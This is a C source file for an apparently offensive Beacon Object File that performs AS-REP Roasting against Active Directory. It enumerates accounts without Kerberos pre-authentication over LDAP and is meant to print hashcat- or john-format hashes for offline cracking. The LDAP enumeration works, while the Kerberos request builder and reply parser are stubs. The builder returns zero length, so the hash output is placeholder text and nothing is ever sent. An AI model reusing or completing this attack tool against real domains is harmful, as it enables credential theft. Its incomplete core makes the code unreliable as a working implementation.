/*
 * asreproast.c — AS-REP Roasting BOF
 *
 * 1. Query LDAP for accounts with DONT_REQUIRE_PREAUTH (UAC & 0x400000)
 * 2. For each account, send AS-REQ without PA-ENC-TIMESTAMP
 * 3. Parse AS-REP and extract encrypted timestamp (etype + cipher)
 * 4. Output in hashcat/john format for offline cracking
 *
 * Win32 APIs: wldap32.dll (LDAP), ws2_32.dll (raw Kerberos), netapi32.dll (DC discovery)
 */
#include <windows.h>
#include <winldap.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include "beacon_compat.h"

/* Dynamic imports */
DECLSPEC_IMPORT LDAP* LDAPAPI WLDAP32$ldap_initW(PWSTR, ULONG);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_bind_sW(LDAP*, PWSTR, PWSTR, ULONG);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_search_sW(LDAP*, PWSTR, ULONG, PWSTR, PWSTR*, ULONG, LDAPMessage**);
DECLSPEC_IMPORT LDAPMessage* LDAPAPI WLDAP32$ldap_first_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT LDAPMessage* LDAPAPI WLDAP32$ldap_next_entry(LDAP*, LDAPMessage*);
DECLSPEC_IMPORT PWSTR* LDAPAPI WLDAP32$ldap_get_valuesW(LDAP*, LDAPMessage*, PWSTR);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_value_freeW(PWSTR*);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_msgfree(LDAPMessage*);
DECLSPEC_IMPORT ULONG LDAPAPI WLDAP32$ldap_unbind(LDAP*);

DECLSPEC_IMPORT int WSAAPI WS2_32$WSAStartup(WORD, LPWSADATA);
DECLSPEC_IMPORT SOCKET WSAAPI WS2_32$socket(int, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$connect(SOCKET, const struct sockaddr*, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$send(SOCKET, const char*, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$recv(SOCKET, char*, int, int);
DECLSPEC_IMPORT int WSAAPI WS2_32$closesocket(SOCKET);
DECLSPEC_IMPORT void WSAAPI WS2_32$WSACleanup(void);
DECLSPEC_IMPORT INT WSAAPI WS2_32$getaddrinfo(PCSTR, PCSTR, const ADDRINFOA*, PADDRINFOA*);
DECLSPEC_IMPORT void WSAAPI WS2_32$freeaddrinfo(PADDRINFOA);

DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameW(LPCWSTR, LPCWSTR, GUID*, LPCWSTR, ULONG, void**);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

DECLSPEC_IMPORT int WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT int WINAPI KERNEL32$WideCharToMultiByte(UINT, DWORD, LPCWCH, int, LPSTR, int, LPCCH, LPBOOL);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetComputerNameExW(int, LPWSTR, LPDWORD);

DECLSPEC_IMPORT wchar_t* __cdecl MSVCRT$wcscpy(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);

/*
 * ASN.1 DER encoding helpers for building AS-REQ (RFC 4120).
 * These are minimal implementations sufficient for the AS-REQ structure.
 */

/* Write ASN.1 tag + length */
static int asn1_write_tl(unsigned char *buf, unsigned char tag, int length) {
    int pos = 0;
    buf[pos++] = tag;
    if (length < 0x80) {
        buf[pos++] = (unsigned char)length;
    } else if (length < 0x100) {
        buf[pos++] = 0x81;
        buf[pos++] = (unsigned char)length;
    } else {
        buf[pos++] = 0x82;
        buf[pos++] = (unsigned char)(length >> 8);
        buf[pos++] = (unsigned char)(length & 0xFF);
    }
    return pos;
}

/*
 * Build a minimal AS-REQ for AS-REP roasting.
 * No PA-ENC-TIMESTAMP — that's the whole point.
 */
static int build_as_req(unsigned char *out, int max_len,
                        const char *username, const char *realm, const char *dc_name) {
    (void)max_len; (void)dc_name;
    unsigned char *p = out;
    int total = 0;

    /* Placeholder — real implementation builds full DER-encoded AS-REQ */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Building AS-REQ for %s@%s (no pre-auth)\n",
                 username, realm);

    /* TODO: Full ASN.1 encoding of AS-REQ per RFC 4120 */
    total = (int)(p - out);
    return total;
}

/*
 * Parse AS-REP to extract encrypted part for offline cracking.
 */
static void parse_as_rep(const unsigned char *data, int len,
                         const char *username, const char *realm, int hashcat_fmt) {
    if (len < 10) return;

    /* Verify this is an AS-REP: tag should be 0x6B ([APPLICATION 11]) */
    if (data[0] != 0x6B) {
        BeaconPrintf(CALLBACK_ERROR, "[!] Not an AS-REP (tag=0x%02X)\n", data[0]);
        return;
    }

    /* TODO: Full ASN.1 parsing to extract etype, checksum, cipher */
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Received AS-REP for %s@%s (%d bytes)\n",
                 username, realm, len);

    if (hashcat_fmt == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "$krb5asrep$23$%s@%s:<checksum>$<cipher>\n",
                     username, realm);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "$krb5asrep$%s@%s:<checksum>$<cipher>\n",
                     username, realm);
    }
}

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *domain = BeaconDataExtract(&parser, NULL);
    char *user = BeaconDataExtract(&parser, NULL);
    char *dc = BeaconDataExtract(&parser, NULL);
    int format = BeaconDataInt(&parser);

    /* Auto-detect domain if not specified */
    wchar_t wDomain[256] = {0};
    if (domain && *domain) {
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, domain, -1, wDomain, 256);
    } else {
        DWORD size = 256;
        KERNEL32$GetComputerNameExW(ComputerNameDnsDomain, wDomain, &size);
    }

    char aDomain[256] = {0};
    KERNEL32$WideCharToMultiByte(CP_UTF8, 0, wDomain, -1, aDomain, 256, NULL, NULL);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] AS-REP Roasting against %s\n", aDomain);

    /* 1. Query LDAP for DONT_REQUIRE_PREAUTH accounts */
    LDAP *ld = WLDAP32$ldap_initW(wDomain, 389);
    if (!ld) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_init failed\n");
        return;
    }

    if (WLDAP32$ldap_bind_sW(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE) != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] ldap_bind failed\n");
        return;
    }

    wchar_t filter[512];
    if (user && *user) {
        wchar_t wUser[256];
        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, user, -1, wUser, 256);
        MSVCRT$swprintf(filter, 512,
            L"(&(objectCategory=person)(objectClass=user)(sAMAccountName=%s)"
            L"(userAccountControl:1.2.840.113556.1.4.803:=4194304))", wUser);
    } else {
        MSVCRT$wcscpy(filter,
            L"(&(objectCategory=person)(objectClass=user)"
            L"(userAccountControl:1.2.840.113556.1.4.803:=4194304))");
    }

    wchar_t *attrs[] = { L"sAMAccountName", L"distinguishedName", NULL };
    LDAPMessage *results = NULL;

    /* Build base DN from domain */
    wchar_t baseDN[512] = {0};
    {
        wchar_t *p = wDomain, *out = baseDN;
        BOOL first = TRUE;
        while (*p) {
            if (!first) { MSVCRT$wcscpy(out, L","); out++; }
            MSVCRT$wcscpy(out, L"DC="); out += 3;
            while (*p && *p != L'.') { *out++ = *p++; }
            if (*p == L'.') p++;
            first = FALSE;
        }
    }

    if (WLDAP32$ldap_search_sW(ld, baseDN, LDAP_SCOPE_SUBTREE, filter, attrs, 0, &results) != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[!] LDAP search failed\n");
        WLDAP32$ldap_unbind(ld);
        return;
    }

    /* 2. For each account, send AS-REQ to KDC */
    WSADATA wsa;
    WS2_32$WSAStartup(MAKEWORD(2, 2), &wsa);

    int count = 0;
    LDAPMessage *entry = WLDAP32$ldap_first_entry(ld, results);
    while (entry) {
        wchar_t **samValues = WLDAP32$ldap_get_valuesW(ld, entry, L"sAMAccountName");
        if (samValues && samValues[0]) {
            char aUser[256];
            KERNEL32$WideCharToMultiByte(CP_UTF8, 0, samValues[0], -1, aUser, 256, NULL, NULL);

            BeaconPrintf(CALLBACK_OUTPUT, "[*] Found: %s (DONT_REQUIRE_PREAUTH)\n", aUser);

            /* Build and send AS-REQ */
            unsigned char as_req[4096];
            int req_len = build_as_req(as_req, sizeof(as_req), aUser, aDomain, dc);

            if (req_len > 0) {
                /* Connect to KDC port 88 */
                /* TODO: send AS-REQ, receive AS-REP, parse hash */
                count++;
            }

            WLDAP32$ldap_value_freeW(samValues);
        }
        entry = WLDAP32$ldap_next_entry(ld, entry);
    }

    WS2_32$WSACleanup();
    WLDAP32$ldap_msgfree(results);
    WLDAP32$ldap_unbind(ld);

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] AS-REP Roasted %d account(s)\n", count);
}
